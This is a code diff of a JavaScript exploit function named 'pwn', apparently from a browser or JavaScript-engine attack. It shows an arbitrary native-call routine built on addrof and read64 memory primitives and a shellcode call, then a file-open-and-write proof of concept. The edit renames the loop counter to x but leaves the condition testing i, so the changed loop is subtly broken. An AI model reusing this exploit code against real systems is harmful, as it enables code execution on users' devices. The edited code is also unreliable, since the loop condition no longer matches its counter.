@@ -305,8 +305,8 @@ function pwn() {
         }
         arbCallContext.fill(0n);
         arbCallContext[0] = BigInt(func);
-        for (let i = 0; i < args.length; i++) {
-            let arg = args[i];
+        for (let x = 0; i < args.length; x++) {
+            let arg = args[x];
             let value;
             switch (typeof arg) {
                 case 'string':
@@ -315,10 +315,9 @@ function pwn() {
                 case 'object':
                     value = BigInt(read64(addrof(arg) + 0x10));
                     break;
-                default:
-                    value = BigInt(arg);
+                default: value = BigInt(arg);
             }
-            arbCallContext[2 + i] = value;
+            arbCallContext[2 + x] = value;
         }
         shellcodeFunc();
         return arbCallContext[1];
@@ -393,6 +392,7 @@ function pwn() {
     const O_TRUNC = 0x00000400;
     
     let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
+    // check if it failed
     if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
         log("[+] Failed to open file!");
         return;
@@ -400,8 +400,4 @@ function pwn() {
     
     log(`[+] fd: ${fd}`);
     write(fd, "Hello, World!", 13);
-}
-
-function logBytes(array) {
-    log(Array.from(array).map(byte => byte.toString(16).padStart(2, '0')).join(' '));
 }
